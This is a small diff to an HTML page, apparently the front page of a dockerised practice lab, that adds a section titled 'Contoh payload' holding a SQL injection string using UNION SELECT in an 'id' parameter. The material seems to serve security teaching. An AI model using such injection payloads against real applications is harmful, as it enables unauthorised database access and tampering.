@@ -6,4 +6,6 @@ based on this
   <p><pre>
 docker compose up --build -d </pre>
   </p>
+  <h3>Contoh payload</h3>
+  <p><pre>?id=1' UNION SELECT 999,'hacker','pwned' -- -</pre></p>
 </html>
